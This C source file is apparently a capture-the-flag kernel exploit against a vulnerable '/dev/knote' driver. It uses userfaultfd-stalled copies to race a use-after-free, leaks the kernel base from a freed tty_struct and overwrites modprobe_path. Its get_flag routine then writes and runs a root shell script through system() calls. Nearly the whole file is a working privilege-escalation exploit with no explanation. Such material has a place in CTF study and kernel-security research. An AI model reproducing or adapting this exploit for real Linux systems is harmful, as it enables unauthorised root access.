#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <string.h>
#include <assert.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define PAGE_SIZE 0x1000
#define TTY_STRUCT_SIZE 0x2E0

int fd, tty_fd;
size_t modprobe_path;

typedef struct
{
	union
	{
		size_t size;
		size_t index;
	};
	char *buf;
}Data;

void get_flag()
{
	puts("[+] Prepare shell file.");
	system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /shell.sh");
	system("chmod +x /shell.sh");
	
	puts("[+] Prepare trigger file.");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /FXC");
	system("chmod +x /FXC");
	
	system("cat /proc/sys/kernel/modprobe");
	system("/FXC");
	system("cat /flag");
	
	sleep(5);
}

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void register_userfault(void *fault_page,void *handler)
{
	pthread_t thr;
	struct uffdio_api ua;
	struct uffdio_register ur;
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if(ioctl(uffd, UFFDIO_API, &ua) == -1)
		ErrExit("[-] ioctl-UFFDIO_API error");
	
	ur.range.start = (unsigned long)fault_page; // the area we want to monitor
	ur.range.len = PAGE_SIZE;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // register missing page error handling. when a missing page occurs, the program will block. at this time, we will operate in another thread
		ErrExit("[-] ioctl-UFFDIO_REGISTER error");
	// open a thread, receive the wrong signal, and the handle it
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if(s!=0)
		ErrExit("[-] pthread-create error");
}

void *userfault_leak_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] leak handler created");
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	sleep(3);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;
	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] leak handler done");
}

void *userfault_change_fd_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] change fd handler created");
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	sleep(3);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;
	// init page
	memset(page, 0, sizeof(page));
	memcpy(page, &modprobe_path, 8);
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] leak handler done");
}

void add(size_t size)
{
	Data data;
	data.size = size;
	data.buf = NULL;
	ioctl(fd, 0x1337, &data);
}

void delete(size_t index)
{
	Data data;
	data.index = index;
	data.buf = NULL;
	ioctl(fd, 0x6666, &data);
}

void edit(size_t index,char *buf)
{
	Data data;
	data.index = index;
	data.buf = buf;
	ioctl(fd, 0x8888, &data);
}

void show(size_t index,char *buf)
{
	Data data;
	data.index = index;
	data.buf = buf;
	ioctl(fd, 0x2333, &data);
}

int main()
{
	fd = open("/dev/knote",2);
	if(fd<0)
		ErrExit("[-] open knote error");
	
	add(TTY_STRUCT_SIZE); // 0
	
	char* leak_base_mmap_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(leak_base_mmap_buf == MAP_FAILED)
		ErrExit("[-] mmap 1 error");
	
	register_userfault(leak_base_mmap_buf,userfault_leak_handler);
	
	int pid = fork();
	if(pid<0)
		ErrExit("[-] fork error");
	else if(pid==0)
	{
		sleep(1);
		delete(0);
		tty_fd = open("/dev/ptmx",2);
		if(tty_fd<0)
			ErrExit("[-] open tty error");
		exit(0);
	}
	else
	{
		show(0,leak_base_mmap_buf);
		close(tty_fd);
		for(int i=0;i<100;i++)
		{
			printf("[+] %2d: 0x%lx\n",i,((size_t*)leak_base_mmap_buf)[i]);
		}
		if(((size_t*)leak_base_mmap_buf)[7] == 0)
			ErrExit("[-] leak error");
		size_t vmlinux_base = ((size_t*)leak_base_mmap_buf)[74] - 0x5d3b90;
		printf("[+] vmlinux_base=> 0x%lx\n",vmlinux_base);
		modprobe_path = vmlinux_base + 0x145c5c0;
	}
	
	sleep(2);
	
	add(0x100); // 0
	
	char* change_fd_mmap_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(change_fd_mmap_buf == MAP_FAILED)
		ErrExit("[-] mmap 2 error");
	
	register_userfault(change_fd_mmap_buf,userfault_change_fd_handler);
	
	pid = fork();
	if(pid<0)
		ErrExit("[-] fork error");
	else if(pid==0)
	{
		sleep(1);
		delete(0);
		exit(0);
	}
	else
	{
		edit(0, change_fd_mmap_buf);
	}
	
	sleep(2);
	
	char* path = "/shell.sh\x00";
	add(0x100); // 0
	add(0x100); // 1
	
	edit(1, path);
	get_flag();
	return 0;
}
